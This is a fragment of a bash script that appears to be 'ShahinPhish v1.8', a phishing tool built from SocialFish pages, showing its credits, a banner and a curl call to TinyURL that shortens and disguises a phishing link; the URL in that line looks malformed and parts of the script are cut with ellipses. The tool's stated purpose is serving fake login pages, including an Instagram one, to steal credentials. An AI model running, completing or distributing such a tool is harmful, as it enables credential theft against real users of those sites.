#!/bin/bash
# ShahinPhish v1.8
# Modified by: Shahin (You dont become a coder by just changing the credits)
# Github: https://github.com/Shahin3010/Shahin.Pishing-
# This script uses some Phishing Pages generated by SocialFish tool (UndeadSec) (https://github.com/UndeadSec/SocialFish)
# Instagram Phishing Page generated by Shahin (https://github.com/Shahin3010) 
...
printf "\n"
printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool modified by:  @🅂🄷🄰🄷🄸🄽 \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\n"
...
send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https:https://www.facebook.com/Shahin.71vau/=$send_link" | head -n1)
